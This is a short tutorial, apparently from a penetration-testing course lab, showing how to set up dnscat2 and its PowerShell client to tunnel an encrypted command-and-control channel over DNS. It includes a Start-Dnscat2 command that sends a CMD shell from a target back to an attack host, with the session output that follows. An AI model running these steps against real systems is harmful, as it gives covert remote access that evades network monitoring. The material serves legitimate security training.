- [Dnscat2](https://github.com/iagox86/dnscat2) is a tunneling tool that uses DNS protocol to send data between two hosts. 
- It uses an encrypted `Command-&-Control` (`C&C` or `C2`) channel and sends data inside TXT records within the DNS protocol.
## Setting Up & Using dnscat2
```shell
git clone https://github.com/iagox86/dnscat2.git
```
#### Starting the dnscat2 server
```shell
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```
#### Cloning dnscat2-powershell to the Attack Host
```shell
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```
Once the `dnscat2.ps1` file is on the target we can import it and run associated cmd-lets.
#### Importing dnscat2.ps1
```powershell
Import-Module .\dnscat2.ps1
```
After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.
```powershell
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```
We must use the pre-shared secret (`-PreSharedSecret`) generated on the server to ensure our session is established and encrypted. If all steps are completed successfully, we will see a session established with our server.
#### Confirming Session Establishment
```shell-session
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

dnscat2>
```
#### Listing dnscat2 Options
```shell-session
dnscat2> ?

Here is a list of commands (use -h on any of them for additional help):
* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows
```
#### Interacting with the Established Session
```shell
window -i 1
```
